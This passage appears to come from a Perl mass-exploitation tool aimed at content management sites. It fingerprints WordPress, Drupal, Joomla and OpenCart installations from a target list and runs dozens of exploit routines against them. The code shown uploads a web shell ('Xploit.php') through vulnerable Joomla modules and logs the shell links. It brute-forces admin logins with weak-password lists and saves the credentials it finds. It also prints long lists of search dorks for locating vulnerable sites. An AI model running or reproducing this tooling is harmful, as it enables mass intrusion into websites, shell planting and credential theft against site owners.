print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $fancyss?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
print TEXT "$fancyss?X=Xploit\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com fancys";
print color('bold white')," ........................ ";
print color('red'),"NOT VULN\n";
}}
################ mod_artuploader #####################
sub artuploader(){
my $url = "$site/modules/mod_artuploader/upload.php";

my $shell ="Xploit.php";

my $response = $ua->post($url, Content_Type => 'multipart/form-data', content => [ ["$shell"] ]);

$artuploaders="$site/modules/mod_artuploader/Xploit.php";

my $checkfoxup = $ua->get("$artuploaders")->content;
if ($checkfoxup =~ /X Xploit/) {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com artuploader";
print color('bold white')," ................... ";
print color('bold green'),"Done\n";
print color('bold white'),"  Shell Uploaded Successfully\n";
print color('bold white'),"  [LINK] => $artuploaders?X=Xploit\n";
open (TEXT, '>>Result/shells.txt');
print TEXT "$artuploaders?X=Xploit\n";
close (TEXT);
}else{
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Com artuploader";
print color('bold white')," ................... ";
print color('red'),"NOT VULN\n";
}}
################joomla brute#######################################3
sub joomlabrute(){
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Start brute force";
print color('bold white')," ................. ";
print color('red'),"Wait\n";
$joomsite = $site . '/administrator/index.php';

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autoTEXT => 1
        )
    );


$getoken = $ua->get($joomsite)->content;
if ( $getoken =~ /name="(.*)" value="1"/ ) {
$token = $1 ;
}else{
print "  Can't Grabb Joomla Token !\n";
next OUTER;
}


@patsj=('123456','123456789','admin123','demo','admin123123','admin123321','12345','112233','Admin','admin123456','123','1234','admin','password','root');
foreach $pmasj(@patsj){
chomp $pmasj;
$joomuser = admin;
$joompass = $pmasj;
print color('red'),"  Trying: $joompass";
print " \n";
$joomlabrute = POST $joomsite, [username => $joomuser, passwd => $joompass, lang =>en-GB, option => user_login, task => login, $token => 1];
$response = $ua->request($joomlabrute);

my $check = $ua->get("$joomsite")->content;
if ($check =~ /logout/){
print "- ";
print color('bold green'),"Done\n";
print color('reset');
open (TEXT, '>>Result/joompassword.txt');
print TEXT "$joomsite => User: $joomuser Pass: $joompass\n";
close (TEXT);
next OUTER;
}
}
}
###### OpenCart #######
sub opencart() {
  print color('bold red'),"[";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Starting brute force\n";
open(a,"passopen.txt") or die "$!";
while(<a>){
chomp($_);
$ocuser = admin;
$ocpass = $_;
print color('bold red')," [";
print color('bold green'),"+";
print color('bold red'),"] ";
print color('bold white'),"Trying: $ocpass \n";
$OpenCart= $site . '/admin/index.php';

$ocbrute = POST $OpenCart, [username => $ocuser, password => $ocpass,];
$response = $ua->request($ocbrute);
$stat = $response->status_line;
if ($stat =~ /302/){
print color('bold green'),"Sucess == > \n $OpenCart User : admin Pass : $ocpass \n";
print color('reset');
open (TEXT, '>>Result/OpenCart.txt');
print TEXT "$OpenCart => User: $ocuser Pass: $ocpass\n";
close (TEXT);
}
}
sub scanwordpress(){
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
print color('green'); 
print q{
     __      __                        .___                                             
    /  \    /  \   ____   _______    __| _/ ______   _______    ____     ______   ______
    \   \/\/   /  /  _ \  \_  __ \  / __ |  \____ \  \_  __ \ _/ __ \   /  ___/  /  ___/
     \        /  (  <_> )  |  | \/ / /_/ |  |  |_> >  |  | \/ \  ___/   \___ \   \___ \ 
      \__/\  /    \____/   |__|    \____ |  |   __/   |__|     \___  > /____  > /____  >
           \/                           \/  |__|                   \/       \/       \/ 
                               
   };
print colored("Your website list: ",'BOLD WHITE');
$list=<STDIN>;
chomp($list);
$a = 0;
open (THETARGET, "<$list") || die "Can't open the file. Please check your command";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

OUTER: foreach $site(@TARGETS){
chomp($site);
$a++;
foreach $site(@list) {
 
if($site !~ /http:\/\//) { $site = "$site/"; };
detect();
}
sub detect($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
my $content = $ua->get("$site")->content;
if($content =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
print color('bold white'), " [";
print color('bold green'),"$a";
print color('bold white'),"] $site ";	
print color("bold green"), " - WordPress\n\n";
print color('reset');
open(TEXT, '>>CMS/wordpress.txt');
print TEXT "$site\n";
close(TEXT);
revslider();
Revsliderss();
wpinstallcheck();
gravityy();
addblockblocker();
blaze();
catpro();
cherry();
downloadsmanager();
formcraft();
levoslideshow();
powerzoomer();
gravityforms();
getconfig();
getconfig2();
showbiz();
ads();
slideshowpro();
wpmobiledetector();
wysija();
inboundiomarketing();
dzszoomsounds();
reflexgallery();
sexycontactform();
sexycontactform2();
simpleplugin();
wtffu();
phpeventcalendar();
synoptic();
Wpshop();
wpinjetc();
acento();
ajaxstore();
Antioch();
Authentic();
Churchope();
Epic();
Felis();
Force();
FR0();
hbaudio();
History();
Imageex();
kbslider();
Linenity();
Lote27();
Markant();
MichaelCanthony();
mTheme();
NativeChurch();
Parallelus();
RedSteel();
S3bubble();
SMWF();
TheLoft();
Trinity();
Urbancity();
Yakimabait();
Membership();
FileManagerwp();
Googlemp3();
Justifiedim();
Justified2();
Justified3();
Aspose();
Asposedoc();
MiwoFTP();
MiwoFTP2();
miniaudioplayer();
Ypotheme();
Media14();
wpmon();
mapprolbs();
}
else{
print color('bold white'), " [";
print color('bold green'),"$a";
print color('bold white'),"] $site ";	
print  color("bold red"), " - Unknown\n\n";
print color('reset');
open(TEXT, '>>CMS/Unknown.txt');
print TEXT "$site\n";
close(TEXT);
}
}
}
}
sub scandrupal(){
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
print color('red');
print q{
  _____                          _  ______
 |  __ \                        | ||  ____|
 | |  | |_ __ _   _ _ __   __ _ | || |__  __  ___ __
 | |  | | '__| | | | '_ \ / _` || ||  __| \ \/ / '_ \ 
 | |__| | |  | |_| | |_) | (_| || || |____ >  <| |_) |
 |_____/|_|   \__,_| .__/ \__,_||_||______/_/\_\ .__/
                   | |                         | |
                   |_|                         |_|     
};
print colored("Enter your websites list: ",'BOLD WHITE');
$list=<STDIN>;
chomp($list);
$a = 0;
open (THETARGET, "<$list") || die "[-] Can't open the file. Please check your command";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

OUTER: foreach $site(@TARGETS){
chomp($site);
$a++;
foreach $site(@lista) {
 
if($site !~ /http:\/\//) { $site = "$site/"; };
drupalscan();
}
sub drupalscan($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (8);
my $content = $ua->get("$site")->content;
if($content =~/Drupal|drupal|sites\/all|drupal.org/) {
print color('bold white'), " [";
print color('bold green'),"$a";
print color('bold white'),"] $site ";	
print color("bold green"), " - Drupal\n\n";
print color('reset');
open(TEXT, '>>CMS/DRUPAL.txt');
print TEXT "$site\n";
close(TEXT);
Drupal();
drupalgeddon();
}
else{
print color('bold white'), " [";
print color('bold green'),"$a";
print color('bold white'),"] $site ";	
print  color("bold red"), " - Unknown\n\n";
print color('reset');
open(TEXT, '>>CMS/Unknown.txt');
print TEXT "$site\n";
close(TEXT);
}
}
}
}
sub scanjoomla(){
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
print color('blue');
print q{
       _                           _       ______                    
      | |                         | |     |  ____|                   
      | | ___  _ __ ___  _ __ ___ | | __ _| |__  __  ___ __          
  _   | |/ _ \| '_ ` _ \| '_ ` _ \| |/ _` |  __| \ \/ / '_ \         
 | |__| | (_) | | | | | | | | | | | | (_| | |____ >  <| |_) |        
  \____/ \___/|_| |_| |_|_| |_| |_|_|\__,_|______/_/\_\ .__/         
                                                      | |            
                                                      |_|            
};
print colored("Enter your websites list: ",'BOLD WHITE');
$list=<STDIN>;
chomp($list);
$a = 0;
open (THETARGET, "<$list") || die "[-] Can't open the file. Please check your command";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

OUTER: foreach $site(@TARGETS){
chomp($site);
$a++;
foreach $site(@lista) {
 
if($site !~ /http:\/\//) { $site = "$site/"; };
joomlascan();
}
sub joomlascan($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (8);
 
my $content = $ua->get("$site")->content;
if($content =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
print color('bold white'), " [";
print color('bold green'),"$a";
print color('bold white'),"] $site ";	
print color("bold green"), " - Joomla\n\n";    
print color('reset');
open(TEXT, '>>CMS/joomla.txt');
print TEXT "$site\n";
close(TEXT);
comjce();
comedia();
comjdownloads();
comjdownloadsdef();
comfabrik();
comfabrikdef();
comfabrik2();
comfabrikdef2();
hdflvplayer();
comadsmanager();
comblog();
comusers();
comweblinks();
com_content();
mod_simplefileupload();
com_search();
com_admin1();
com_admin2();
com_content1();
com_content2();
com_weblinks();
com_mailto();
com_content3();
com_content4();
com_users();
com_installer();
com_search1();
com_poll();
com_banners();
com_mailto1();
com_a6mambocredits();
com_a6mambohelpdesk();
com_advancedpoll();
com_akocomment();
com_articles();
com_artlinks();
com_trade();
com_bayesiannaivefilter();
com_babackup();
redmy();
facile();
sujks();
rocks();
genesissimple();
developertools();
artuploader();
fancys();
hwdvideoshare();
ksadvertiser();
osproperty();
collector();
NovaSFH();
Jimtawl();
Proclaim();
fox2();
b22j();
b2j();
}
else{
print color('bold white'), " [";
print color('bold green'),"$a";
print color('bold white'),"] $site ";	
print  color("bold red"), " - Unknown\n\n";
print color('reset');
open(TEXT, '>>CMS/Unknown.txt');
print TEXT "$site\n";
close(TEXT);
}
}
}
}
sub scanopencart(){
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
print colored("Enter your websites list: ",'BOLD WHITE');
$list=<STDIN>;
chomp($list);
$a = 0;
open (THETARGET, "<$list") || die "[-] Can't open the file. Please check your command";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;

OUTER: foreach $site(@TARGETS){
chomp($site);
$a++;
foreach $site(@lista) {
 
if($site !~ /http:\/\//) { $site = "$site/"; };
cart();
}
sub cart($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (8);
 
my $content = $ua->get("$site")->content;
if($content =~/opencart\/OpenCart/) {
print color('bold white'), " [";
print color('bold green'),"$a";
print color('bold white'),"] $site ";	
print color("bold green"), " - OpenCart\n\n";
print color('reset');
open(TEXT, '>>CMS/OpenCart.txt');
print TEXT "$site\n";
close(TEXT);
OpenCart();
}
else{
print color('bold white'), " [";
print color('bold green'),"$a";
print color('bold white'),"] $site ";	
print  color("bold red"), " - Unknown\n\n";
print color('reset');
open(TEXT, '>>CMS/Unknown.txt');
print TEXT "$site\n";
close(TEXT);
}
}
}
}
sub getdork(){
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
print color('bold white'), " [";
print color('bold green'),"+";
print color('bold white'),"] Drupal Dorks"; print color('bold white'), " [";
print color('bold green'),"+";
print color('bold white'),"]\n\n
user/login powered by drupal
user/login
node/1
node/1
node/add/page
?q=user/1
?q=user/2
?q=user/3
?q=user/4
?q=user/5\n\n";

print color('bold white'), " [";
print color('bold green'),"+";
print color('bold white'),"] Wordpress Dorks ";
print color('bold white'), " [";
print color('bold green'),"+";
print color('bold white'),"] \n\n
			
inurl:/wp-content/plugins/gravityforms/
/wp-content/plugins/gravityforms/
index of /wp-content/uploads/gravity_forms/
inurl:/wp-content/uploads/gravity_forms/
inurl:/wp-content/plugins/gravityforms/
inurl:wp-content/plugins/revslider/
inurl:revslider
inurl:revslider_admin.php
inurl:revslider_front.php
inurl:plugins/revslider/
intext:Powered by Revslider
intitle:Index Of/ revslider
intitle:Index Of/wp-content/plugins/revslider
intitle:Index Of/admin/revslider
Index Of/admin/revslider
Index Of/wp-content/plugins/revslider
Index Of/ revslider
revslider_admin.php
/wp-admin/admin-post.php?page=wysija
admin-post.php?page=wysija
powered by wordpress
wordpress
wp-login.php
wp-admin/
wp-config.php
/wp-content/themes/framework/
/wp-content/themes/eCommerce/
/wp-content/themes/wpstore
/wp-content/themes/eShopinurl
wp-content/themes/KidzStore
/wp-content/themes/Emporium
/wp-content/themes/Store
mgl-instagram-gallery/single-gallery.php?media
/wp-admin/setup-config.php
Setup Configuration File
wordfence
/wp-content/uploads/levoslideshow/
1 Flash Gallery
360 Product Rotation
Tevolution
Addblockblocker \n\n";

 
print color('bold white'), " [";
print color('bold green'),"+";
print color('bold white'),"] Joomla Dorks ";
print color('bold white'), " [";
print color('bold green'),"+";
print color('bold white'),"]\n\n
				
inurl:/index.php?option=com_jce
index.php?option=com_jce
index.php?option=com_aardvertiser
index.php?option=com_akobook
index.php?option=com_abbrev
index.php?option=com_gk3_photoslide
index.php?option=com_abc
index.php?option=com_aclassf
index.php?option=com_acprojects
index.php?option=com_acstartseite
index.php?option=com_acteammember
index.php?option=com_actions
index.php?option=com_acymailing
index.php?option=com_addressbook
index.php?option=com_adds
index.php?option=com_rsticketspro
index.php?option=com_adsmanager
index.php?option=com_advertising
index.php?option=com_ag_vodmatvil
index.php?option=com_agency
index.php?option=com_agenda
index.php?option=com_ajaxchat
index.php?option=com_alameda
index.php?option=com_alfresco
index.php?option=com_alfurqan15x
index.php?option=com_allcinevid
index.php?option=com_traxartist
index.php?option=com_flippingbook
index.php?option=com_amblog
index.php?option=com_aml_2
index.php?option=com_annonces
index.php?option=com_appointinator
index.php?option=com_appointment
index.php?option=com_aprice
index.php?option=com_arcadegames
index.php?option=com_archeryscores
index.php?option=com_articleman
index.php?option=com_articlemanager
index.php?option=com_autartimonial
index.php?option=com_avosbillets
index.php?option=com_awiki
index.php?option=com_uhp
index.php?option=com_beamospetition
index.php?option=com_beamspetition
index.php?option=com_bfquiztrial
index.php?option=com_bfsurvey
index.php?option=com_bfsurvey_basic
index.php?option=com_bfsurvey_pro
index.php?option=com_biblestudy
index.php?option=com_biblioteca
index.php?option=com_bidding
index.php?option=com_billyportfolio
index.php?option=com_blog
index.php?option=com_blogfactory
index.php?option=com_book
index.php?option=com_bookflip
index.php?option=com_booklibrary
index.php?option=com_btg_oglas
index.php?option=com_caddy
index.php?option=com_calcbuilder
index.php?option=com_calendario
index.php?option=com_canteen
index.php?option=com_carman
index.php?option=com_cartikads
index.php?option=com_cartweberp
index.php?option=com_casino
index.php?option=com_category
index.php?option=com_cbe
index.php?option=com_cbresumebuilder
index.php?option=com_ccboard
index.php?option=com_ccinvoices
index.php?option=com_ccnewsletter
index.php?option=com_ccrowdsource
index.php?option=com_cgtestimonial
index.php?option=com_chronocontact
index.php?option=com_clan
index.php?option=com_clanlist
index.php?option=com_clantools
index.php?option=??m_?hil?f?rm
index.php?option=com_easybook
index.php?option=com_simpleboard
index.php?option=com_admin
index.php?option=com_htmlarea3_xtd-c
index.php?option=com_sitemap
index.php?option=com_ewriting
index.php?option=com_performs
index.php?option=com_forum
index.php?option=com_productshowcase
index.php?option=com_menus
index.php?option=com_musica
index.php?option=com_colorlab
index.php?option=com_community
index.php?option=com_comp
index.php?option=com_componen
index.php?option=com_component
index.php?option=com_connect
index.php?option=com_content
index.php?option=com_contentbloglist
index.php?option=com_countries
index.php?option=com_crowdsource
index.php?option=com_cvmaker
index.php?option=com_dailymeals
index.php?option=com_dashboard
index.php?option=com_dateconverter
index.php?option=com_datsogallery
index.php?option=com_myalbum
index.php?option=com_dcnews
index.php?option=com_delicious
index.php?option=com_diary
index.php?option=com_digifolio
index.php?option=com_digistore
index.php?option=com_dioneformwizard
index.php?option=com_dir
index.php?option=com_discussions
index.php?option=com_djclassifieds
index.php?option=com_dms
index.php?option=com_doqment
index.php?option=com_drawroot
index.php?option=com_dshop
index.php?option=com_education_classess
index.php?option=com_elite_experts
index.php?option=com_eportfolio
index.php?option=com_equipment
index.php?option=com_esearch
index.php?option=com_event
index.php?option=com_eventcal
index.php?option=com_eventing
index.php?option=com_extcalendar
index.php?option=com_mospray
index.php?option=com_smf
index.php?option=com_pollxt
index.php?option=com_ezautos
index.php?option=com_loudmounth
index.php?option=com_videodb
index.php?option=com_ezine
index.php?option=com_family
index.php?option=com_fastball
index.php?option=com_fireboard
index.php?option=com_flashgames
index.php?option=com_flexicontent
index.php?option=com_flipwall
index.php?option=com_football
index.php?option=com_forme
index.php?option=com_fss
index.php?option=com_g2bridge
index.php?option=com_gambling
index.php?option=com_gamesbox
index.php?option=com_gantry
index.php?option=com_gbufacebook
index.php?option=com_gds
index.php?option=com_gigfe
index.php?option=com_golfcourseguide
index.php?option=com_google
index.php?option=com_graphics
index.php?option=com_grid
index.php?option=com_gsticketsystem
index.php?option=com_guide
index.php?option=com_hbssearch
index.php?option=com_hdflvplayer
index.php?option=com_hdvideoshare
index.php?option=com_hello
index.php?option=com_hezacontent
index.php?option=com_hitexam
index.php?option=com_hmcommunity
index.php?option=com_horoscope
index.php?option=com_hotbrackets
index.php?option=com_huruhelpdesk
index.php?option=com_if_nexus
index.php?option=com_ijoomla_archive
index.php?option=com_ijoomla_rss
index.php?option=com_img
index.php?option=com_immobilien
index.php?option=com_include
index.php?option=com_intuit
index.php?option=com_iotaphotogallery
index.php?option=com_iproperty
index.php?option=com_ircmbasic
index.php?option=com_itarmory
index.php?option=com_items
index.php?option=com_jacomment
index.php?option=com_jashowcase
index.php?option=com_javoice
index.php?option=com_jbook
index.php?option=com_jbpublishdownfp
index.php?option=com_jce
index.php?option=com_jcollection
index.php?option=com_jdirectory
index.php?option=com_jdownloads
index.php?option=com_jdrugstopics
index.php?option=com_jeajaxeventcalendar
index.php?option=com_jeauto
index.php?option=com_jedirectory
index.php?option=com_jeemaarticlecollection
index.php?option=com_jeemasms
index.php?option=com_jefaqpro
index.php?option=com_jeguestbook
index.php?option=com_jepoll
index.php?option=com_jequoteform
index.php?option=com_jesectionfinder
index.php?option=com_jestory
index.php?option=com_jesubmit
index.php?option=com_jfuploader
index.php?option=com_jgen
index.php?option=com_jim
index.php?option=com_jimtawl
index.php?option=com_jinc
index.php?option=com_jlord_rss
index.php?option=com_jmsfileseller
index.php?option=com_jnewsletter
index.php?option=com_jnewspaper
index.php?option=com_job
index.php?option=com_jomdocs
index.php?option=com_jomestate
index.php?option=com_jomsocial
index.php?option=com_jomtube
index.php?option=com_joomdle
index.php?option=com_joomdocs
index.php?option=com_joomgalleryfunc
index.php?option=com_joomlaconnect_be
index.php?option=com_joomlaflashfun
index.php?option=com_joomlaflickr
index.php?option=com_joomlaupdater
index.php?option=com_joomla-visites
index.php?option=com_joommail
index.php?option=com_joomnik
index.php?option=com_joomportfolio
index.php?option=com_joomtouch
index.php?option=com_jp_jobs
index.php?option=com_jphone
index.php?option=com_jpodium
index.php?option=com_j-projects
index.php?option=com_jquarks4s
index.php?option=com_jreactions
index.php?option=com_jreservation
index.php?option=com_jscalendar
index.php?option=com_jshop
index.php?option=com_jstore
index.php?option=com_jsubscription
index.php?option=com_jsupport
index.php?option=com_jtickets
index.php?option=com_jtm
index.php?option=com_jukebox
index.php?option=com_juliaportfolio
index.php?option=com_jwhmcs
index.php?option=com_k2
index.php?option=com_king
index.php?option=com_kk
index.php?option=com_konsultasi
index.php?option=com_ksadvertiser
index.php?option=com_kunena
index.php?option=com_lead
index.php?option=com_leader
index.php?option=com_libros
index.php?option=com_listbingo
index.php?option=com_listing
index.php?option=com_lovefactory
index.php?option=com_lyftenbloggie
index.php?option=com_maianmedia
index.php?option=com_manager
index.php?option=com_market
index.php?option=com_magazine
index.php?option=com_marketplace
index.php?option=com_markt
index.php?option=com_matamko
index.php?option=com_mdigg
index.php?option=com_media_library
index.php?option=com_mediamall
index.php?option=com_mediqna
index.php?option=com_memory
index.php?option=com_menu
index.php?option=com_mochigames
index.php?option=com_mosres
index.php?option=com_mtfireeagle
index.php?option=com_mtree
index.php?option=com_multimap
index.php?option=com_multiroot
index.php?option=com_mamml
index.php?option=com_mycar
index.php?option=com_mycontent
index.php?option=com_myfiles
index.php?option=com_myhome
index.php?option=com_mysms
index.php?option=com_na_content
index.php?option=com_na_newsdescription
index.php?option=com_nicetalk
index.php?option=com_network
index.php?option=com_newsletter
index.php?option=com_fq
index.php?option=com_newsfeeds
index.php?option=com_nfnaddressbook
index.php?option=com_ninjamonials
index.php?option=com_noticeboard
index.php?option=com_noticias
index.php?option=com_obsuggest
index.php?option=com_oprykningspoint_mc
index.php?option=com_ops
index.php?option=com_otzivi
index.php?option=com_oziogallery2
index.php?option=com_packages
index.php?option=com_pandafminigames
index.php?option=com_pandarminigames
index.php?option=com_pbbooking
index.php?option=com_pc
index.php?option=com_securityimages
index.php?option=com_artlinks
index.php?option=com_people
index.php?option=com_perchagallery
index.php?option=com_galleria
index.php?option=com_phocadocumentation
index.php?option=com_phocagallery
index.php?option=com_photobattle
index.php?option=com_photomapgallery
index.php?option=com_php
index.php?option=com_picsell
index.php?option=com_portfol
index.php?option=com_portfolio
index.php?option=com_powermail
index.php?option=com_press
index.php?option=com_prime
index.php?option=com_pro_desk
index.php?option=com_properiesaid
index.php?option=com_propertylab
index.php?option=com_question
index.php?option=com_quickfaq
index.php?option=com_radio
index.php?option=com_record
index.php?option=com_restaurant
index.php?option=com_restaurantmenumanager
index.php?option=com_rokmodule
index.php?option=com_rsappt_pro
index.php?option=com_rsappt_pro2
index.php?option=com_rscomments
index.php?option=com_rsform
index.php?option=com_rsgallery2
index.php?option=com_rssreader
index.php?option=com_s2clanroster
index.php?option=com_sar_news
index.php?option=com_science
index.php?option=com_searchlog
index.php?option=com_sebercart
index.php?option=com_serie
index.php?option=com_sermonspeaker
index.php?option=com_seyret
index.php?option=com_simplefaq
index.php?option=com_simpleshop
index.php?option=com_smartsite
index.php?option=com_socialads
index.php?option=com_software
index.php?option=com_solution
index.php?option=com_soundset
index.php?option=com_serverstat
index.php?option=com_spa
index.php?option=com_spartsite
index.php?option=com_spec
index.php?option=com_spielothek
index.php?option=com_sportfusion
index.php?option=com_spsnewsletter
index.php?option=com_sqlreport
index.php?option=com_start
index.php?option=com_staticxt
index.php?option=com_surveymanager
index.php?option=com_svmap
index.php?option=com_sweetykeeper
index.php?option=com_tariff
index.php?option=com_teacher
index.php?option=com_team
index.php?option=com_teams
index.php?option=com_techfolio
index.php?option=com_television
index.php?option=com_tender
index.php?option=com_timereturns
index.php?option=com_timetrack
index.php?option=com_topmenu
index.php?option=com_tour
index.php?option=com_tpjobs
index.php?option=com_trabalhe_conosco
index.php?option=com_trading
index.php?option=com_travelbook
index.php?option=com_ttvideo
index.php?option=com_tupinambis
index.php?option=com_ultimateportfolio
index.php?option=com_units
index.php?option=com_universal
index.php?option=com_users
index.php?option=com_vat
index.php?option=com_vehiclemanager
index.php?option=com_vid
index.php?option=com_vikrealestate
index.php?option=com_vjdeo
index.php?option=com_vxdate
index.php?option=com_wallpapers
index.php?option=com_weblinks
index.php?option=com_webtv
index.php?option=com_wgpicasa
index.php?option=com_wmi
index.php?option=com_wmptic
index.php?option=com_wmtpic
index.php?option=com_wrapper
index.php?option=com_xcloner-backupandrestore
index.php?option=com_xevidmegahd
index.php?option=com_xgallery
index.php?option=com_xmovie
index.php?option=com_yanc
index.php?option=com_yvhotels
index.php?option=com_zimbcomment
index.php?option=com_zimbcore
index.php?option=com_zina
index.php?option=com_zoom
index.php?option=com_zoomprotfolio
index.php?option=com_fm
index.php?option=phocaguestbook
index.php?option=mailto
index.php?option=con_extplorer
index.php?option=com_worldrates
index.php?option=com_glossary
index.php?option=com_musepoes
index.php?option=com_buslicense
index.php?option=com_recipes
index.php?option=com_jokes
index.php?option=com_estateagent
index.php?option=com_catalogshop
index.php?option=com_akogallery
index.php?option=com_garyscookbook
index.php?option=com_flyspray
index.php?option=com_hashcash
index.php?option=com_mambads
index.php?option=com_hotproperty
index.php?option=com_directory
index.php?option=com_awesom
index.php?option=com_shambo2
index.php?option=com_downloads
index.php?option=com_peoplebook
index.php?option=com_guest
index.php?option=com_quote
index.php?option=com_gallery
index.php?option=com_neogallery
index.php?option=com_comments
index.php?option=com_rapidrecipe
index.php?option=com_board
index.php?option=com_xfaq
index.php?option=com_paxxgallery
index.php?option=com_quiz
index.php?option=com_ricette
index.php?option=com_jooget
index.php?option=com_jotloader
index.php?option=com_jradio
index.php?option=com_jquarks
index.php?option=com_sponsorwall
index.php?option=com_registration
index.php?option=com_zoomportfolio
index.php?option=com_dirfrm
index.php?option=com_jgrid
index.php?option=com_ongallery
index.php?option=com_neorecruit
index.php?option=com_joomla
index.php?option=com_youtube
index.php?option=com_sar
index.php?option=com_jsjobs
index.php?option=com_beeheard
index.php?option=com_activehelper
index.php?option=com_camp
index.php?option=com_awdwall
index.php?option=com_joltcard
index.php?option=com_if
index.php?option=com_gadgetfactory
index.php?option=com_qpersonel
index.php?option=com_mv
index.php?option=com_weberpcustomer
index.php?option=com_articles
index.php?option=com_webeecomment
index.php?option=com_xobbix
index.php?option=com_loginbox
index.php?option=com_shoutbox
index.php?option=com_dwgraphs
index.php?option=com_xmap
index.php?option=com_business
index.php?option=com_departments
index.php?option=com_smestorage
index.php?option=com_aml
index.php?option=com_flash
index.php?option=com_jwmmxtd
index.php?option=com_giftexchange
index.php?option=com_jeformcr
index.php?option=com_org
index.php?option=com_about
index.php?option=com_color
index.php?option=com_party
index.php?option=com_liveticker
index.php?option=com_joomlaconnect
index.php?option=com_communitypolls
index.php?option=com_videos
index.php?option=com_productbook
index.php?option=com_photoblog
index.php?option=com_jequizmanagement
index.php?option=com_biographies
index.php?option=com_gurujibook
index.php?option=com_gameserver
index.php?option=com_jvideodirect
index.php?option=com_rd
index.php?option=com_artistavenue
index.php?option=com_airmonoblock
index.php?option=com_dhforum
index.php?option=com_trabalhe
index.php?option=com_oprykningspoint
index.php?option=com_adagency
index.php?option=com_morfeoshow
index.php?option=com_mediaslide
index.php?option=com_jcalpro
index.php?option=com_zcalendar
index.php?option=com_acmisc
index.php?option=com_virtuemart
index.php?option=com_docman
index.php?option=com_joomgallery
index.php?option=com_mojo
index.php?option=com_joaktree
index.php?option=com_mygallery
index.php?option=Com_Joomclip
index.php?option=com_mytube
index.php?option=com_jbudgetsmagic
index.php?option=com_rsmonials
index.php?option=com_cmimarketplace
index.php?option=com_mailto
index.php?option=com_maianmusic
index.php?option=com_pcchess
index.php?option=com_prod
index.php?option=com_waticketsystem
index.php?option=com_news
index.php?option=com_pccookbook
index.php?option=com_fantasytournament
index.php?option=com_camelcitydb
index.php?option=com_paxgallery
index.php?option=com_ice
index.php?option=com_livechat
index.php?option=com_feederator
index.php?option=com_competitions
index.php?option=com_clickheat
index.php?option=com_dailymessage
index.php?option=com_ignitegallery
index.php?option=com_joomtracker
index.php?option=com_hotspots
index.php?option=com_is
index.php?option=com_gameq
index.php?option=com_prayercenter
index.php?option=com_webhosting
index.php?option=com_alphacontent
index.php?option=com_filiale
index.php?option=com_extplorer
index.php?option=com_actualite
index.php?option=com_d
index.php?option=com_astatspro
index.php?option=com_search
index.php?option=com_expose
index.php?option=com_philaform
index.php?option=com_mosmedia
index.php?option=com_thopper
index.php?option=com_resman
index.php?option=com_poll
index.php?option=com_kochsuite
index.php?option=com_linkdirectory
index.php?option=com_lmo
index.php?option=com_rss
index.php?option=com_oziogallery
index.php?option=com_noticia
index.php?option=com_kkcontent
index.php?option=com_jphoto
index.php?option=com_quicknews
index.php?option=com_musicgallery
index.php?option=com_pinboard
index.php?option=com_amocourse
index.php?option=com_jfusion
index.php?option=com_misterestate
index.php?option=com_tpdugg
index.php?option=com_alphauserpoints
index.php?option=com_foobla
index.php?option=com_jlord
index.php?option=com_facebook
index.php?option=com_groupjive
index.php?option=com_jd
index.php?option=com_recerca
index.php?option=com_icrmbasic
index.php?option=com_album
index.php?option=com_lucygames
index.php?option=com_siirler
index.php?option=com_idoblog
index.php?option=com_pms
index.php?option=com_jobline
index.php?option=com_K
index.php?option=com_jumi
index.php?option=com_ijoomla
index.php?option=com_media
index.php?option=com_omphotogallery
index.php?option=com_seminar
index.php?option=com_jvideo
index.php?option=com_agoragroup
index.php?option=Com_Agora
index.php?option=com_rsgallery
index.php?option=com_bsadv
index.php?option=com_djiceshoutbox
index.php?option=com_rdautos
index.php?option=com_na
index.php?option=com_simple
index.php?option=com_allhotels
index.php?option=com_volunteer
index.php?option=com_tech
index.php?option=com_mydyngallery
index.php?option=com_jmovies
index.php?option=com_thyme
index.php?option=com_catalogproduction
index.php?option=com_contactinfo
index.php?option=com_jb
index.php?option=com_dadamail
index.php?option=com_ongumatimesheet
index.php?option=com_googlebase
index.php?option=com_treeg
index.php?option=com_ab
index.php?option=com_kbase
index.php?option=com_ionfiles
index.php?option=com_ds
